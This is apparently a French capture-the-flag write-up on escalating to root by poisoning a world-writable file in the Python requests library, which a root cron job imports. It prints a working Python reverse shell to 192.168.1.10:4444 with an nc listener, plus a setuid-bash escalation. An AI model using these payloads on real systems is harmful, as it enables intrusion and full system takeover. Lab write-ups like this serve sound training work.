# Write-Up - Pentest / Fatal Request

## Environnement

Une fois que l'on est sur la machine, on peut voir un message de Franck qui mentionne un script intéressant.

Après un peu de reconnaissance sur la machine on retrouve le fichier dans `/scripts/web_grabber.py`.

> One liner des enfer pour trouver les scripts sur une machine :
`for l in $(echo ".py .pyc .pl .jar .c .sh");do echo -e "\nExtension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`

Le *web_grabber* écrit son retour dans `/tmp/data.txt` et on peut voir avec le timestamp que le script est exécuté toute les minutes.

Cela nous pointe vers l'utilisation d'une tâche planifiée que l'on peut retrouver dans **crontab** sur la machine :

```bash
cat /etc/crontab
---
* * * * * root python3 /scripts/web_grabber.py
```

Le script est bien exécuté toutes les minutes par le compte root.

Il doit y avoir quelques chose à faire pour injecter une commande dans ce script...

## Exploitation de permissions

> TLDR: commande `find / -type f -writable 2> /dev/null` ou Linpeas pour trouver les permissions inappropriées sur la machine.

On sait que le script a des problèmes de permission sur lesquels on doit sûrement mettre le doigt.

Les droits en écritures sur le script ne sont accordés qu'à `root`, on ne peut donc pas modifier le contenu pour y ajouter une commande.

On peut vérifie les imports (indice dans le nom du challenge) et on vient tatonner du côté des librairies utilisées avec :

```bash
pip3 show requests
---
Name: requests
Version: 2.32.3
Summary: Python HTTP for Humans.
Home-page: https://requests.readthedocs.io
Author: Kenneth Reitz
Author-email: me@kennethreitz.org
License: Apache-2.0
Location: /usr/local/lib/python3.10/site-packages
Requires: certifi, charset-normalizer, idna, urllib3
```

On va donc naviguer dans les fichiers de la bibliothèque et on remarque qu'un des submodules de requests a des **permissions en écriture** par les utilisateurs.

```bash
ls -al /usr/local/lib/python3.10/site-packages/requests/
drwxr-xr-x 3 root root  4096 Mar 12 17:19 .
drwxr-xr-x 1 root root  4096 Mar 12 17:19 ..
-rw-r--r-- 1 root root  5072 Mar 12 17:19 __init__.py
[...]
-rw-r--r-- 1 root root 27451 Mar 12 17:19 adapters.py
-rw-r--rw- 1 root root  6449 Mar 12 17:19 api.py
-rw-r--r-- 1 root root 10186 Mar 12 17:19 auth.py
[...]
```

## Ajouter du code malicieux dans la bibliothèque requests

### Méthode 1

On ajoute dans la fonction `requests.get()` un reverse shell python :

```bash
import os,pty,socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("sh")
```

Et on attend qu'il revienne avec :

```bash
nc -lnvp 4444
```

### Méthode 2

On peut ajouter un bit setuid sur */bin/bash* pour pouvoir s'élever en root :

```bash
# adding suid to /bin/bash
os.system("chmod u+s /bin/bash")
# then launch bash with -p
/bin/bash -p
```
